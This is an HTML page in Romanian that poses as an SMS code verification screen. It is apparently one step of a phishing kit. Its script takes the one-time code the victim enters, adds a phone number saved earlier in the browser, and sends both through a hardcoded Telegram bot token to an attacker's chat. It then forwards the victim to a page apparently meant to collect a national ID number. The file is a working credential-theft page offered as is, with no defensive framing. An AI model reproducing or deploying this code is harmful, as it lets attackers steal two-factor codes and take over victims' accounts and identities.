<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background-color: white; width: 100%; max-width: 400px; height: 100vh; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; }
        .back-button { font-size: 24px; cursor: pointer; margin-bottom: 20px; color: #333; text-decoration: none; }
        h1 { font-size: 26px; color: #1a1a1a; margin: 0 0 30px 0; line-height: 1.3; font-weight: 700; }
        .input-label { color: #666; font-size: 15px; margin-bottom: 15px; display: block; }
        .otp-group { display: flex; justify-content: space-between; gap: 8px; }
        .otp-input { width: 100%; height: 55px; border: 2px solid #e0e0e0; border-radius: 10px; text-align: center; font-size: 22px; font-weight: bold; background-color: #f9f9f9; outline: none; -moz-appearance: textfield; }
        .otp-input::-webkit-outer-spin-button, .otp-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .otp-input:focus { border-color: #002352; background-color: #fff; }
        .btn-continue { background-color: #002352; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; margin-top: auto; margin-bottom: 20px; cursor: pointer; width: 100%; }
    </style>
</head>
<body>
    <div class="container">
        <a href="index.html" class="back-button">‚Üê</a>
        <h1>Un cod SMS de 4 sau 6 cifre a fost trimis la acest numƒÉr de telefon</h1>
        <label class="input-label">Introduce»õi aici codul care v-a fost trimis</label>
        <div class="otp-group" id="otp-inputs">
            <input type="number" class="otp-input" oninput="limitAndNext(this, 0)">
            <input type="number" class="otp-input" oninput="limitAndNext(this, 1)">
            <input type="number" class="otp-input" oninput="limitAndNext(this, 2)">
            <input type="number" class="otp-input" oninput="limitAndNext(this, 3)">
            <input type="number" class="otp-input" oninput="limitAndNext(this, 4)">
            <input type="number" class="otp-input" oninput="limitAndNext(this, 5)">
        </div>
        <button class="btn-continue" onclick="sendOTP()">ContinuƒÉ</button>
    </div>

    <script>
        const botToken = "8750310622:AAGlyWo1lsyJZGX9RopjWIF6a8VyvNPCmnA";
        const chatId = "8129155953";
        const inputs = document.querySelectorAll('.otp-input');

        function limitAndNext(el, index) {
            if (el.value.length > 1) el.value = el.value.slice(0, 1);
            if (el.value && index < inputs.length - 1) inputs[index + 1].focus();
        }

        function sendOTP() {
            let code = "";
            inputs.forEach(i => code += i.value);
            if(code.length >= 4) {
                localStorage.setItem('smsCode', code);
                const phone = localStorage.getItem('userPhone') || "Unknown";
                const msg = `üí¨ **SMS Code Received**\nüì± Phone: \`${phone}\`\nüî¢ Code: \`${code}\``;
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
                .then(() => window.location.href = 'idnp.html');
            } else { alert("Introduce»õi codul!"); }
        }
    </script>
</body>
</html>